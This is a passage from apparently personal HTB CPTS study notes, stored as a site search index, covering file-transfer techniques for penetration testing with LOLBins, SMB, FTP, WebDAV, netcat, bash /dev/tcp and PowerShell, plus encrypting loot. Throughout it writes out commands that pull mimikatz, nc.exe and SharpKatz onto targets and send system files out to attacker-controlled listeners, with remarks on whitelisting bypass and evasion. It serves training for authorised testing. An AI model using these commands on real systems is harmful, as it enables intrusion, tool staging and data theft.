binaries.\"</p>"},{"location":"CPTS/File%20Transfers/evasion_detection/#example-gfxdownloadwrapperexe","title":"Example: GfxDownloadWrapper.exe","text":"<p>The Intel Graphics Driver for Windows 10 (<code>GfxDownloadWrapper.exe</code>), installed on some systems, contains functionality to periodically download configuration files. This functionality can be leveraged as follows:</p> <p>Transferring File with GfxDownloadWrapper.exe:</p> <pre><code>PS C:\\htb&gt; GfxDownloadWrapper.exe \"http://10.10.10.132/mimikatz.exe\" \"C:\\Temp\\nc.exe\"\n</code></pre> <p>Such binaries may bypass application whitelisting and avoid alerting. Other binaries can also be found via the LOLBAS project for Windows and the GTFOBins project for Linux. These resources provide detailed information on commonly installed binaries suitable for file transfers.</p>"},{"location":"CPTS/File%20Transfers/evasion_detection/#closing-thoughts","title":"Closing Thoughts","text":"<p>There are numerous ways to transfer files between an attack host and Windows or Linux systems. Practicing these methods in various environments helps to:</p> <ul> <li> <p>Build familiarity with tools and techniques.</p> </li> <li> <p>Save time during assessments by knowing multiple file transfer options.</p> </li> </ul> <p>When working on a target or lab, experiment with LOLBins or GTFOBins you haven't used before to accomplish file transfer goals. Regularly revisiting these methods ensures preparedness for diverse scenarios.</p> <p>Also, take advantage of web shells or other footholds by testing alternative file transfer methods such as:</p> <ul> <li> <p>Certutil for downloading files.</p> </li> <li> <p>Impacket SMB server.</p> </li> <li> <p>Python web servers with upload capabilities.</p> </li> </ul> <p>With practice and creativity, you'll become adept at transferring files covertly and effectively during engagements.</p>"},{"location":"CPTS/File%20Transfers/file_transfer_operations/","title":"File transfer operations","text":""},{"location":"CPTS/File%20Transfers/file_transfer_operations/#smb-downloads","title":"SMB Downloads","text":"<p>The Server Message Block (SMB) protocol, running on TCP/445, is commonly used in Windows-based enterprise networks for file sharing. SMB allows users and applications to transfer files between machines. To download files from a Pwnbox, you can set up an SMB server using Impacket's <code>smbserver.py</code>. The basic command to set up the server is:</p> <pre><code>sudo impacket-smbserver share -smb2support /tmp/smbshare\n</code></pre> <p>You can download files using <code>copy</code> on the target machine:</p> <pre><code>copy \\\\192.168.220.133\\share\\nc.exe\n</code></pre> <p>Newer versions of Windows block unauthenticated guest access. To bypass this, configure the SMB server with a username and password:</p> <pre><code>sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test\n</code></pre> <p>Then, mount the SMB server on the target machine:</p> <pre><code>net use n: \\\\192.168.220.133\\share /user:test test\ncopy n:\\nc.exe\n</code></pre>"},{"location":"CPTS/File%20Transfers/file_transfer_operations/#ftp-downloads","title":"FTP Downloads","text":"<p>FTP (TCP/21) is another file transfer method. To set up an FTP server on your attack host, install the <code>pyftpdlib</code> Python module:</p> <pre><code>sudo pip3 install pyftpdlib\nsudo python3 -m pyftpdlib --port 21\n</code></pre> <p>To transfer files, you can use the built-in FTP client or PowerShell\u2019s <code>Net.WebClient</code>:</p> <pre><code>(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\\Users\\Public\\ftp-file.txt')\n</code></pre> <p>For an interactive shell, create a command file for the FTP client:</p> <pre><code>echo open 192.168.49.128 &gt; ftpcommand.txt\necho USER anonymous &gt;&gt; ftpcommand.txt\necho binary &gt;&gt; ftpcommand.txt\necho GET file.txt &gt;&gt; ftpcommand.txt\necho bye &gt;&gt; ftpcommand.txt\nftp -v -n -s:ftpcommand.txt\n</code></pre>"},{"location":"CPTS/File%20Transfers/file_transfer_operations/#upload-operations","title":"Upload Operations","text":"<p>Uploading files from a target machine can be done similarly to downloading, using methods like PowerShell encoding or web-based uploads. For encoding, you can base64 encode a file in PowerShell:</p> <pre><code>[Convert]::ToBase64String((Get-Content -path \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Encoding byte))\n</code></pre> <p>On the attack host, decode the file:</p> <pre><code>echo &lt;base64_string&gt; | base64 -d &gt; hosts\nmd5sum hosts\n</code></pre> <p>For web uploads, use a Python web server configured for file uploads, such as <code>uploadserver</code>:</p> <pre><code>pip3 install uploadserver\npython3 -m uploadserver\n</code></pre> <p>Then, use PowerShell to upload the file:</p> <pre><code>Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts\n</code></pre> <p>This completes the processes for downloading and uploading files using SMB, FTP, and PowerShell web uploads.</p>"},{"location":"CPTS/File%20Transfers/file_transfer_operations/#powershell-base64-web-upload","title":"PowerShell Base64 Web Upload","text":"<p>This method demonstrates how PowerShell can be used to encode a file in Base64 and upload it to a server using <code>Invoke-WebRequest</code>. The payload is transmitted as a POST request to a specified URI, and the data is then caught using Netcat. Afterward, the data is decoded back to its original form.</p>"},{"location":"CPTS/File%20Transfers/file_transfer_operations/#step-1-encoding-the-file-in-base64","title":"Step 1: Encoding the File in Base64","text":"<p>First, we convert the contents of a file (<code>hosts</code> file in this case) into Base64:</p> <pre><code>$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts' -Encoding Byte))\n</code></pre> <p>This command reads the <code>hosts</code> file as raw bytes and then converts it into a Base64 string.</p>"},{"location":"CPTS/File%20Transfers/file_transfer_operations/#step-2-uploading-the-encoded-file-via-http","title":"Step 2: Uploading the Encoded File via HTTP","text":"<p>Next, we use <code>Invoke-WebRequest</code> to upload the Base64 encoded file to a remote server. The server is assumed to be listening on port 8000:</p> <pre><code>Invoke-WebRequest -Uri &lt;http://192.168.49.128:8000/&gt; -Method POST -Body $b64\n</code></pre> <p>Here, we send the encoded file as a POST request with the Base64 string as the body.</p>"},{"location":"CPTS/File%20Transfers/file_transfer_operations/#step-3-catching-the-data-with-netcat","title":"Step 3: Catching the Data with Netcat","text":"<p>On the receiving server (listening on port 8000), we use Netcat to catch the incoming Base64 data:</p> <pre><code>$ nc -lvnp 8000\n</code></pre> <p>Netcat listens for connections and displays the incoming data. The Base64-encoded content appears in the console.</p>"},{"location":"CPTS/File%20Transfers/file_transfer_operations/#step-4-decoding-the-file","title":"Step 4: Decoding the File","text":"<p>After receiving the Base64-encoded data, we decode it back to its original file using the <code>base64</code> tool:</p> <pre><code>bash\nCopy code\necho &lt;base64&gt; | base64 -d -w 0 &gt; hosts\n</code></pre> <p>This command takes the Base64 data, decodes it, and writes it back to a file (<code>hosts</code>).</p>"},{"location":"CPTS/File%20Transfers/file_transfer_operations/#smb-uploads-via-webdav","title":"SMB Uploads via WebDAV","text":"<p>The next section discusses using SMB over HTTP with WebDAV. Many organizations restrict SMB traffic (TCP/445) due to security concerns, but WebDAV provides a workaround by running SMB over HTTP (TCP/80). This method is commonly used for file sharing and remote access.</p>"},{"location":"CPTS/File%20Transfers/file_transfer_operations/#setting-up-webdav-server","title":"Setting Up WebDAV Server","text":"<p>To set up a WebDAV server, we install the necessary Python modules:</p> <pre><code>$ sudo pip3 install wsgidav cheroot\n</code></pre> <p>Then, we run the WebDAV server:</p> <pre><code>$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous\n</code></pre> <p>This command runs the WebDAV server on port 80, serving files from <code>/tmp</code> with anonymous authentication.</p>"},{"location":"CPTS/File%20Transfers/file_transfer_operations/#connecting-to-the-webdav-share","title":"Connecting to the WebDAV Share","text":"<p>Once the WebDAV server is set up, we can access it from a Windows machine using the <code>DavWWWRoot</code> folder:</p> <pre><code>dir \\\\\\\\192.168.49.128\\\\DavWWWRoot\n</code></pre> <p>This command lists the files available on the WebDAV server.</p>"},{"location":"CPTS/File%20Transfers/file_transfer_operations/#uploading-files-via-webdav","title":"Uploading Files via WebDAV","text":"<p>To upload a file (e.g., <code>SourceCode.zip</code>) to the WebDAV share, we use the <code>copy</code> command:</p> <pre><code>C:\\\\Users\\\\john\\\\Desktop\\\\SourceCode.zip \\\\\\\\192.168.49.128\\\\DavWWWRoot\\\\\n</code></pre> <p>This uploads the specified file to the WebDAV share, allowing for easy file transfer over HTTP.</p>"},{"location":"CPTS/File%20Transfers/file_transfer_operations/#ftp-uploads","title":"FTP Uploads","text":"<p>FTP (File Transfer Protocol) is another method for uploading files. In this section, we discuss how to set up an FTP server using Python's <code>pyftpdlib</code> module and how to use PowerShell or command line tools to upload files to it.</p>"},{"location":"CPTS/File%20Transfers/file_transfer_operations/#setting-up-the-ftp-server","title":"Setting Up the FTP Server","text":"<p>We start the FTP server with the <code>--write</code> flag to allow uploading:</p> <pre><code>$ sudo python3 -m pyftpdlib --port 21 --write\n</code></pre> <p>This starts the FTP server on port 21, with write permissions for anonymous users.</p>"},{"location":"CPTS/File%20Transfers/file_transfer_operations/#uploading-files-via-powershell","title":"Uploading Files via PowerShell","text":"<p>Using PowerShell, we can upload a file to the FTP server with the following command:</p> <pre><code>(New-Object Net.WebClient).UploadFile('&lt;ftp://192.168.49.128/ftp-hosts&gt;', 'C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts')\n</code></pre> <p>This command uploads the <code>hosts</code> file to the specified FTP server.</p>"},{"location":"CPTS/File%20Transfers/file_transfer_operations/#creating-an-ftp-command-file","title":"Creating an FTP Command File","text":"<p>Alternatively, you can create an FTP command file (<code>ftpcommand.txt</code>) to automate the file upload process:</p> <pre><code>echo open 192.168.49.128 &gt; ftpcommand.txt\necho USER anonymous &gt;&gt; ftpcommand.txt\necho binary &gt;&gt; ftpcommand.txt\necho PUT c:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts &gt;&gt; ftpcommand.txt\necho bye &gt;&gt; ftpcommand.txt\nftp -v -n -s:ftpcommand.txt\n</code></pre> <p>This script automates logging in, setting the transfer mode to binary, uploading the file, and closing the connection.</p>"},{"location":"CPTS/File%20Transfers/file_transfer_operations/#recap","title":"Recap","text":"<p>This section highlighted multiple methods to upload files using native tools such as PowerShell, FTP, and WebDAV. Each method allows file transfer under different network configurations, offering flexibility in various penetration testing scenarios.</p>"},{"location":"CPTS/File%20Transfers/living_off_the_land/","title":"Living off the land","text":""},{"location":"CPTS/File%20Transfers/living_off_the_land/#living-off-the-land","title":"Living off The Land","text":"<p>The phrase \"Living off the land\" was coined by Christopher Campbell (@obscuresec) and Matt Graeber (@mattifestation) at DerbyCon 3.</p> <p>The term LOLBins (Living off the Land binaries) originated from a Twitter discussion about naming binaries that attackers can use to perform actions beyond their original purpose. Two primary websites aggregate information on Living off the Land binaries:</p> <ul> <li> <p>LOLBAS Project for Windows Binaries https://lolbas-project.github.io/</p> </li> <li> <p>GTFOBins for Linux Binaries https://gtfobins.github.io/</p> </li> </ul>"},{"location":"CPTS/File%20Transfers/living_off_the_land/#common-uses-of-living-off-the-land-binaries","title":"Common Uses of Living off the Land Binaries","text":"<p>Living off the Land binaries can be used to perform various functions, including:</p> <ul> <li> <p>Download</p> </li> <li> <p>Upload</p> </li> <li> <p>Command Execution</p> </li> <li> <p>File Read</p> </li> <li> <p>File Write</p> </li> <li> <p>Bypasses</p> </li> </ul> <p>This guide focuses on using the LOLBAS and GTFOBins projects, providing examples for download and upload functions on Windows and Linux systems.</p>"},{"location":"CPTS/File%20Transfers/living_off_the_land/#using-the-lolbas-and-gtfobins-projects","title":"Using the LOLBAS and GTFOBins Projects","text":""},{"location":"CPTS/File%20Transfers/living_off_the_land/#lolbas-windows","title":"LOLBAS (Windows)","text":"<p>To search for download and upload functions in LOLBAS, use the <code>/download</code> or <code>/upload</code> search options.</p> <p>Example: Using CertReq.exe</p> <ol> <li> <p>Listen on a port on the attack host using Netcat.</p> </li> <li> <p>Execute <code>certreq.exe</code> to upload a file.</p> </li> </ol> <p>Command:</p> <pre><code>C:\\htb&gt; certreq.exe -Post -config http://192.168.49.128:8000/ c:\\windows\\win.ini\n</code></pre> <p>Netcat Session Output:</p> <pre><code>0xs5@htb[/htb]$ sudo nc -lvnp 8000\n\nlistening on [any] 8000 ...\nconnect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819\nPOST / HTTP/1.1\nCache-Control: no-cache\nConnection: Keep-Alive\nPragma: no-cache\nContent-Type: application/json\n...\n[Mail]\nMAPI=1\n</code></pre> <p>Note: If <code>certreq.exe</code> throws an error, ensure it supports the <code>-Post</code> parameter. Updated versions are available online.</p>"},{"location":"CPTS/File%20Transfers/living_off_the_land/#gtfobins-linux","title":"GTFOBins (Linux)","text":"<p>To search for download and upload functions in GTFOBins, use <code>+file download</code> or <code>+file upload</code>.</p> <p>Example: Using OpenSSL OpenSSL is frequently installed and can be used for file transfer similarly to Netcat.</p> <ol> <li>Create a certificate and start a server on the attack host:</li> </ol> <p>Commands:</p> <pre><code>0xs5@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem\n\n0xs5@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem &lt; /tmp/LinEnum.sh\n</code></pre> <ol> <li>Download the file from the compromised machine:</li> </ol> <p>Command:</p> <pre><code>0xs5@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet &gt; LinEnum.sh\n</code></pre>"},{"location":"CPTS/File%20Transfers/living_off_the_land/#other-common-living-off-the-land-tools","title":"Other Common Living off the Land Tools","text":""},{"location":"CPTS/File%20Transfers/living_off_the_land/#bitsadmin","title":"Bitsadmin","text":"<p>The Background Intelligent Transfer Service (BITS) can download files from HTTP sites and SMB shares while minimizing impact on user activity.</p> <p>File Download with Bitsadmin:</p> <pre><code>PS C:\\htb&gt; bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\\Users\\htb-student\\Desktop\\nc.exe\n</code></pre> <p>PowerShell Integration:</p> <pre><code>PS C:\\htb&gt; Import-Module bitstransfer; Start-BitsTransfer -Source \"http://10.10.10.32:8000/nc.exe\" -Destination \"C:\\Windows\\Temp\\nc.exe\"\n</code></pre>"},{"location":"CPTS/File%20Transfers/living_off_the_land/#certutil","title":"Certutil","text":"<p>Certutil, a utility included in all Windows versions, can download files. However, AMSI often flags its usage as malicious.</p> <p>Command:</p> <pre><code>C:\\htb&gt; certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe\n</code></pre>"},{"location":"CPTS/File%20Transfers/living_off_the_land/#practice-and-exploration","title":"Practice and Exploration","text":"<ul> <li> <p>Explore the LOLBAS and GTFOBins websites.</p> </li> <li> <p>Experiment with various file transfer methods.</p> </li> <li> <p>Take detailed notes on obscure techniques; they can save time during assessments.</p> </li> </ul>"},{"location":"CPTS/File%20Transfers/living_off_the_land/#detection-and-evasion","title":"Detection and Evasion","text":"<p>The final sections will cover:</p> <ul> <li> <p>Detection considerations for file transfers.</p> </li> <li> <p>Steps to evade detection during assessments requiring evasive testing.</p> </li> </ul>"},{"location":"CPTS/File%20Transfers/miscellaneous_file_transfer/","title":"Miscellaneous file transfer","text":""},{"location":"CPTS/File%20Transfers/miscellaneous_file_transfer/#miscellaneous-file-transfer-methods","title":"Miscellaneous File Transfer Methods","text":"<p>We've covered various methods for transferring files on Windows and Linux. We also explored ways to achieve the same goal using different programming languages, but there are still many more methods and applications that we can use.</p> <p>This section will cover alternative methods such as transferring files using Netcat, Ncat, and using RDP and PowerShell sessions.</p>"},{"location":"CPTS/File%20Transfers/miscellaneous_file_transfer/#netcat","title":"Netcat","text":"<p>Netcat (often abbreviated to <code>nc</code>) is a computer networking utility for reading from and writing to network connections using TCP or UDP, which means it can be used for file transfer operations.</p> <p>The original Netcat was released by Hobbit in 1995, but it hasn't been maintained despite its popularity. The flexibility and usefulness of this tool prompted the Nmap Project to produce Ncat, a modern reimplementation that supports SSL, IPv6, SOCKS and HTTP proxies, connection brokering, and more.</p> <p>In this section, we will use both the original Netcat and Ncat.</p> <p>Note: Ncat is used in HackTheBox's PwnBox as <code>nc</code>, <code>ncat</code>, and <code>netcat</code>.</p>"},{"location":"CPTS/File%20Transfers/miscellaneous_file_transfer/#file-transfer-with-netcat-and-ncat","title":"File Transfer with Netcat and Ncat","text":"<p>The target or attacking machine can initiate the connection, which is helpful if a firewall prevents access to the target. Let's create an example to transfer a tool to our target.</p>"},{"location":"CPTS/File%20Transfers/miscellaneous_file_transfer/#example-1-using-netcat-original","title":"Example 1: Using Netcat (Original)","text":"<ol> <li> <p>On the compromised machine, start Netcat listening with:</p> <pre><code>nc -l -p 8000 &gt; SharpKatz.exe\n</code></pre> </li> <li> <p>From the attacking host, send the file with:</p> <pre><code>wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe\n0xs5@htb[/htb]$ nc -q 0 192.168.49.128 8000 &lt; SharpKatz.exe\n</code></pre> </li> </ol>"},{"location":"CPTS/File%20Transfers/miscellaneous_file_transfer/#example-2-using-ncat","title":"Example 2: Using Ncat","text":"<ol> <li> <p>On the compromised machine, start Ncat with:</p> <pre><code>ncat -l -p 8000 --recv-only &gt; SharpKatz.exe\n</code></pre> </li> <li> <p>From the attacking host, send the file with:</p> <pre><code>ncat --send-only 192.168.49.128 8000 &lt; SharpKatz.exe\n</code></pre> </li> </ol>"},{"location":"CPTS/File%20Transfers/miscellaneous_file_transfer/#reverse-file-transfer","title":"Reverse File Transfer","text":"<p>Instead of listening on the compromised machine, we can:</p> <ol> <li> <p>On the attacking host, listen with:</p> <pre><code>sudo ncat -l -p 443 --send-only &lt; SharpKatz.exe\n</code></pre> </li> <li> <p>On the compromised machine, connect to the attacker with:</p> <pre><code>ncat 192.168.49.128 443 --recv-only &gt; SharpKatz.exe\n</code></pre> </li> </ol>"},{"location":"CPTS/File%20Transfers/miscellaneous_file_transfer/#alternative-using-bash","title":"Alternative Using Bash","text":"<p>If Netcat/Ncat is unavailable on the compromised machine, Bash can perform read/write operations on <code>/dev/tcp/</code>:</p> <ol> <li> <p>On the attacking host:</p> <pre><code>sudo nc -l -p 443 -q 0 &lt; SharpKatz.exe\n</code></pre> </li> <li> <p>On the compromised machine:</p> <pre><code>cat &lt; /dev/tcp/192.168.49.128/443 &gt; SharpKatz.exe\n</code></pre> </li> </ol>"},{"location":"CPTS/File%20Transfers/miscellaneous_file_transfer/#powershell-session-file-transfer","title":"PowerShell Session File Transfer","text":"<p>PowerShell Remoting, aka WinRM, can transfer files when HTTP, HTTPS, or SMB are unavailable. PowerShell Remoting uses:</p> <ul> <li> <p>TCP/5985 for HTTP</p> </li> <li> <p>TCP/5986 for HTTPS</p> </li> </ul>"},{"location":"CPTS/File%20Transfers/miscellaneous_file_transfer/#example-file-transfer-via-winrm","title":"Example: File Transfer via WinRM","text":"<ol> <li> <p>Confirm connectivity from DC01 to DATABASE01:</p> <pre><code>PS C:\\htb&gt; Test-NetConnection -ComputerName DATABASE01 -Port 5985\n</code></pre> </li> <li> <p>Create a session:</p> <pre><code>PS C:\\htb&gt; $Session = New-PSSession -ComputerName DATABASE01\n</code></pre> </li> <li> <p>Transfer files:</p> <ul> <li> <p>From DC01 to DATABASE01:</p> <pre><code>PS C:\\htb&gt; Copy-Item -Path C:\\samplefile.txt -ToSession $Session -Destination C:\\Users\\Administrator\\Desktop\\\n</code></pre> </li> <li> <p>From DATABASE01 to DC01:</p> <pre><code>PS C:\\htb&gt; Copy-Item -Path \"C:\\Users\\Administrator\\Desktop\\DATABASE.txt\" -Destination C:\\ -FromSession $Session\n</code></pre> </li> </ul> </li> </ol>"},{"location":"CPTS/File%20Transfers/miscellaneous_file_transfer/#rdp-file-transfer","title":"RDP File Transfer","text":"<p>RDP (Remote Desktop Protocol) allows file transfers using copy/paste or mounting local resources:</p> <ol> <li> <p>From Linux:</p> <ul> <li> <p>Using <code>rdesktop</code>:</p> <pre><code>rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'\n</code></pre> </li> <li> <p>Using <code>xfreerdp</code>:</p> <pre><code>xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer\n</code></pre> </li> </ul> </li> <li> <p>From Windows:</p> <ul> <li>Use mstsc.exe to share a local drive during connection.</li> </ul> </li> </ol> <p>Note: Mounted drives are private to the session and inaccessible to other users.</p>"},{"location":"CPTS/File%20Transfers/miscellaneous_file_transfer/#practice-makes-perfect","title":"Practice Makes Perfect","text":"<p>Mastering these techniques is essential for real-world assessments and labs. Apply them in:</p> <ul> <li> <p>Active Directory Enumeration and Attacks</p> </li> <li> <p>Pivoting, Tunneling &amp; Port Forwarding</p> </li> <li> <p>Attacking Enterprise Networks</p> </li> <li> <p>Shells &amp; Payloads</p> </li> </ul> <p>Experiment with each method to build muscle memory and adaptability for different environments. In the next section, we'll discuss protecting file transfers when dealing with sensitive data.</p>"},{"location":"CPTS/File%20Transfers/protected_file_transfer/","title":"Protected file transfer","text":""},{"location":"CPTS/File%20Transfers/protected_file_transfer/#protected-file-transfers","title":"Protected File Transfers","text":"<p>As penetration testers, we often gain access to highly sensitive data such as user lists, credentials (e.g., downloading the NTDS.dit file for offline password cracking), and enumeration data that can contain critical information about the organization's network infrastructure and Active Directory (AD) environment. It is essential to encrypt this data or use encrypted data connections such as SSH, SFTP, and HTTPS. However, when these options are unavailable, alternative approaches are required.</p> <p>Note: Unless specifically requested by a client, we do not recommend exfiltrating data such as Personally Identifiable Information (PII), financial data (e.g., credit card numbers), or trade secrets from a client environment. For testing Data Loss Prevention (DLP) controls or egress filtering protections, create a file with dummy data that mimics the data the client is trying to protect. Encrypting the data or files before transfer is crucial to prevent interception during transit.</p> <p>Data leakage during a penetration test could have severe consequences for the penetration tester, their company, and the client. As information security professionals, we must act responsibly and take all measures to protect any data encountered during an assessment.</p>"},{"location":"CPTS/File%20Transfers/protected_file_transfer/#file-encryption-on-windows","title":"File Encryption on Windows","text":"<p>Many methods can encrypt files and information on Windows systems. One of the simplest methods is using the <code>Invoke-AESEncryption.ps1</code> PowerShell script. This script provides encryption of files and strings.</p>"},{"location":"CPTS/File%20Transfers/protected_file_transfer/#invoke-aesencryptionps1","title":"Invoke-AESEncryption.ps1","text":"<p><pre><code>&lt;#\n.SYNOPSIS\nEncryptes or Decrypts Strings or Byte-Arrays with AES\n\n.DESCRIPTION\nTakes a String or File and a Key and encrypts or decrypts it with AES256 (CBC)\n\n.PARAMETER Mode\nEncryption or Decryption Mode\n\n.PARAMETER Key\nKey used to encrypt or decrypt\n\n.PARAMETER Text\nString value to encrypt or decrypt\n\n.PARAMETER Path\nFilepath for file to encrypt or decrypt\n\n.EXAMPLE\nInvoke-AESEncryption -Mode Encrypt -Key \"p@ssw0rd\" -Text \"Secret Text\"\n\nDescription\n-----------\nEncrypts the string \"Secret Test\" and outputs a Base64 encoded cipher text.\n\n.EXAMPLE\nInvoke-AESEncryption -Mode Decrypt -Key \"p@ssw0rd\" -Text \"LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=\"\n\nDescription\n-----------\nDecrypts the Base64 encoded string \"LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=\" and outputs plain text.\n\n.EXAMPLE\nInvoke-AESEncryption -Mode Encrypt -Key \"p@ssw0rd\" -Path file.bin\n\nDescription\n-----------\nEncrypts the file \"file.bin\" and outputs an encrypted file \"file.bin.aes\"\n\n.EXAMPLE\nInvoke-AESEncryption -Mode Encrypt -Key \"p@ssw0rd\" -Path file.bin.aes\n\nDescription\n-----------\nDecrypts the file \"file.bin.aes\" and outputs an encrypted file \"file.bin\"\n#&gt;\nfunction Invoke-AESEncryption {\n    [CmdletBinding()]\n    [OutputType([string])]\n    Param\n    (\n        [Parameter(Mandatory = $true)]\n        [ValidateSet('Encrypt', 'Decrypt')]\n        [String]$Mode,\n\n        [Parameter(Mandatory = $true)]\n        [String]$Key,\n\n        [Parameter(Mandatory = $true, ParameterSetName = \"CryptText\")]\n        [String]$Text,\n\n        [Parameter(Mandatory = $true, ParameterSetName = \"CryptFile\")]\n        [String]$Path\n    )\n\n    Begin {\n        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed\n        $aesManaged = New-Object System.Security.Cryptography.AesManaged\n        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC\n        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros\n        $aesManaged.BlockSize = 128\n        $aesManaged.KeySize = 256\n    }\n\n    Process {\n        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))\n\n        switch ($Mode) {\n            'Encrypt' {\n                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}\n\n                if ($Path) {\n                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue\n                    if (!$File.FullName) {\n                        Write-Error -Message \"File not found!\"\n                        break\n                    }\n                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)\n                    $outPath = $File.FullName + \".aes\"\n                }\n\n                $encryptor = $aesManaged.CreateEncryptor()\n                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)\n                $encryptedBytes = $aesManaged.IV + $encryptedBytes\n                $aesManaged.Dispose()\n\n                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}\n\n                if ($Path) {\n                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)\n                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime\n                    return \"File encrypted to $outPath\"\n                }\n            }\n\n            'Decrypt' {\n                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}\n\n                if ($Path) {\n                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue\n                    if (!$File.FullName) {\n                        Write-Error -Message \"File not found!\"\n                        break\n                    }\n                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)\n                    $outPath = $File.FullName -replace \".aes\"\n                }\n\n                $aesManaged.IV = $cipherBytes[0..15]\n                $decryptor = $aesManaged.CreateDecryptor()\n                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)\n                $aesManaged.Dispose()\n\n                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}\n\n                if ($Path) {\n                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)\n                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime\n                    return \"File decrypted to $outPath\"\n                }\n            }\n        }\n    }\n\n    End {\n        $shaManaged.Dispose()\n        $aesManaged.Dispose()\n    }\n}\n</code></pre> Example Usage:</p> <ol> <li> <p>Encrypt a String:</p> <pre><code>Invoke-AESEncryption -Mode Encrypt -Key \"p@ssw0rd\" -Text \"Secret Text\"\n</code></pre> <p>Description: Encrypts the string \"Secret Text\" and outputs a Base64 encoded ciphertext.</p> </li> <li> <p>Decrypt a String:</p> <pre><code>Invoke-AESEncryption -Mode Decrypt -Key \"p@ssw0rd\" -Text \"LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=\"\n</code></pre> <p>Description: Decrypts the Base64 encoded string and outputs plain text.</p> </li> <li> <p>Encrypt a File:</p> <pre><code>Invoke-AESEncryption -Mode Encrypt -Key \"p@ssw0rd\" -Path file.bin\n</code></pre> <p>Description: Encrypts the file \"file.bin\" and outputs \"file.bin.aes\".</p> </li> <li> <p>Decrypt a File:</p> <pre><code>Invoke-AESEncryption -Mode Decrypt -Key \"p@ssw0rd\" -Path file.bin.aes\n</code></pre> <p>Description: Decrypts \"file.bin.aes\" and outputs the original file.</p> </li> </ol> <p>Importing and Using the Script:</p> <p>Transfer the script to the target host and import it as a module:</p> <pre><code>PS C:\\htb&gt; Import-Module .\\Invoke-AESEncryption.ps1\n</code></pre> <p>Encrypting a File Example:</p> <pre><code>PS C:\\htb&gt; Invoke-AESEncryption -Mode Encrypt -Key \"p4ssw0rd\" -Path .\\scan-results.txt\n</code></pre> <p>Output:</p> <pre><code>File encrypted to C:\\htb\\scan-results.txt.aes\n</code></pre> <p>Note: Use strong and unique passwords for encryption for each company to prevent sensitive information from being decrypted with a compromised password.</p>"},{"location":"CPTS/File%20Transfers/protected_file_transfer/#file-encryption-on-linux","title":"File Encryption on Linux","text":"<p><code>OpenSSL</code> is a common tool included in Linux distributions, often used for generating security certificates and encrypting files.</p>"},{"location":"CPTS/File%20Transfers/protected_file_transfer/#encrypting-files-with-openssl","title":"Encrypting Files with OpenSSL","text":"<p>Example:</p> <pre><code>openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc\n</code></pre> <p>Description: Encrypts \"/etc/passwd\" using AES-256 encryption.</p> <p>Decrypting Files:</p> <pre><code>openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd\n</code></pre> <p>Description: Decrypts \"passwd.enc\" back to its original format.</p> <p>Best Practices:</p> <ul> <li> <p>Always use strong, unique passwords to avoid brute-force attacks.</p> </li> <li> <p>Use secure transport methods such as HTTPS, SFTP, or SSH to transfer files.</p> </li> </ul>"},{"location":"CPTS/File%20Transfers/protected_file_transfer/#secure-file-transfers","title":"Secure File Transfers","text":"<p>When transferring files during penetration tests, always prioritize secure protocols:</p> <ul> <li> <p>SSH, SFTP, HTTPS: Preferred methods for transferring encrypted data.</p> </li> <li> <p>Alternative Tools: Practice examples using target hosts or modules such as Pwnbox to replicate secure file transfer scenarios.</p> </li> </ul> <p>By encrypting sensitive files and leveraging secure transfer methods, penetration testers can mitigate risks associated with data interception and ensure responsible handling of client information.</p>"},{"location":"CPTS/File%20Transfers/transfer_files_wtih_code/","title":"Transferring Files with Code","text":"<p>When targeting machines, we often find different programming languages installed. Commonly encountered languages include Python, PHP, Perl, and Ruby, especially on Linux distributions. These languages can also be installed on Windows, though less frequently. Additionally, Windows default applications like <code>cscript</code> and <code>mshta</code> allow execution of JavaScript or VBScript code, which can also be used on Linux hosts.</p> <p>With approximately 700 programming languages available, we can create code in many of them to download, upload, or execute instructions on an OS. This section provides examples using some 